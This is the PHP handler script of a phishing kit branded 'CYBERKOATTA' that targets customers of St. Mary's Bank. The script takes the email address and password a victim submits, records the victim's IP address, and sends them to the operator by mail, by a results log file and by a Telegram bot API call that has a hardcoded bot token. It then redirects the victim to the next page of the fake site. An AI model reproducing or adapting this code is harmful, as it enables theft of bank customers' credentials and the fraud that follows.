<?php
error_reporting(0);
$settings = include '../../../settings/settings.php';

if(empty($_POST['em']) || !isset($_POST['em'])){
    echo "<script>window.location.href = \"../session_emma\"; </script>";
       setcookie("logged_in", "0");
} else {
       setcookie("logged_in", "1");
}

if(empty($_POST['epass']) || !isset($_POST['epass'])){
  echo "<script>window.location.href = \"../session_emma\"; </script>";
       setcookie("logged_in", "0");
} else {
       setcookie("logged_in", "1");
}


# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$email = $_POST['em'];
$email_pass = $_POST['epass'];


# Messsage
$message = "[⚓️ CYBERKOATTA ⚓️ St.Mary'S BANK ⚓️ CLIENT ⚓️:{$client} ⚓️]\n\n";
$message .= "********** [ 📩 EMAIL LOGIN 📩 ] **********\n";
$message .= "# EMAIL       : {$email}\n";
$message .= "# PASSWORD    : {$email_pass}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: koatta <koatta@client_{$client}_site.com>\r\n";
    $subject = "⚓️ CYBERKOATTA ⚓️ St.Mary'S BANK ⚓️ EMAIL ⚓️ CLIENT ⚓️ #{$client} ⚓️ {$IP}";
    $msg =$message;
    mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
    $results = fopen($filename, "a+");
    fwrite($results,$message);
    fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/bot1878487514:AAFbK9igwqokOhmyxbmmjld9zyXh-qbIPmQ";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}


    echo "<script>window.location.href =\"../session_personal\"; </script>";

?>
